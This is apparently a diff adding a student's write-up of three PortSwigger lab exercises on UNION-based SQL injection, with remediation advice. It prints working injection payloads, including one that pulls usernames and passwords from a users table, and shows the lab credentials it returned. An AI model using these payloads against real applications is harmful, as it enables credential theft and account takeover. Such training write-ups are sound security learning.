@@ -1,0 +1,120 @@
+Lab 7: SQL Injection UNION Attack - Determining Number of Columns
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - UNION Attacks
+Status: ✅ Solved
+
+Objective
+Determine the exact number of columns returned by the original query using a UNION-based SQL injection.
+
+Key Concept
+For a UNION attack to work, the injected query must return the same number of columns as the original query. Two methods exist:
+
+ORDER BY method
+UNION SELECT NULL method
+
+
+Steps to Solve
+Method used — NULL method:
+' UNION SELECT NULL--         (error)
+' UNION SELECT NULL,NULL--    (error)
+' UNION SELECT NULL,NULL,NULL-- (success ✅)
+When no error appeared → 3 columns confirmed
+
+Tool Used
+
+Burp Suite Repeater (to test payloads quickly)
+Browser
+
+
+Impact
+Informational — This is a reconnaissance step. By itself it doesn't extract data, but it enables further UNION attacks.
+
+Remediation
+
+Use parameterized queries
+Implement WAF (Web Application Firewall)
+
+
+
+Lab 8: SQL Injection UNION Attack - Finding a Column Containing Text
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - UNION Attacks
+Status: ✅ Solved
+
+Objective
+After finding the number of columns, identify which column accepts string (text) data so it can be used to extract information.
+
+Key Concept
+Not all columns accept string data — some may only accept integers. We need to find which column can display text output.
+
+Steps to Solve
+
+Already knew there were 3 columns (from Lab 7)
+Tested each column position with a string value:
+
+' UNION SELECT 'a',NULL,NULL--   (error = col 1 not string)
+' UNION SELECT NULL,'a',NULL--   (success ✅ = col 2 is string)
+
+Column 2 accepted string data — confirmed ✅
+
+
+Tool Used
+
+Burp Suite Repeater
+Browser
+
+
+Impact
+Informational — Identifies the extraction point for UNION-based data retrieval attacks.
+
+Remediation
+
+Parameterized queries prevent UNION injection entirely
+
+
+
+Lab 9: SQL Injection UNION Attack - Retrieving Data from Other Tables
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - UNION Attacks
+Status: ✅ Solved
+
+Objective
+Use a UNION attack to retrieve all usernames and passwords from the users table, then log in as administrator.
+
+Steps to Solve
+
+Confirmed 2 columns, both accept strings:
+
+' UNION SELECT 'a','a'--
+
+Extracted data from users table:
+
+' UNION SELECT username,password FROM users--
+
+Page displayed:
+
+administrator | s3cur3p4ssw0rd
+wiener | peter
+carlos | montoya
+
+Logged in as administrator using extracted credentials ✅
+
+
+Tool Used
+
+Burp Suite (Intercept + Repeater)
+Browser
+
+
+Impact
+Critical — All user credentials extracted from the database. Complete account takeover of all users including admin.
+
+Remediation
+
+Parameterized queries / prepared statements
+Hash all passwords (bcrypt, Argon2)
+Principle of least privilege on DB user
+WAF to detect UNION patterns
